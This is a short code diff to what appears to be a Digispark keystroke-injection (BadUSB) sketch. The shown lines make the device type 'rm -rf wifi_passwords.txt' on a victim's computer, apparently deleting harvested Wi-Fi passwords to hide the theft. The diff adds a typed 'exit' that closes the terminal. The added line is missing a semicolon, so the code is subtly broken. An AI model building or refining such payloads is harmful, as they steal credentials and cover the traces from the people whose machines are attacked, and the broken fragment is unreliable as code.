@@ -28,6 +28,8 @@ void loop() {
   DigiKeyboard.delay(1000);
   
   DigiKeyboard.println("rm -rf wifi_passwords.txt"); 
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("exit")
   DigiKeyboard.delay(100);
   
  
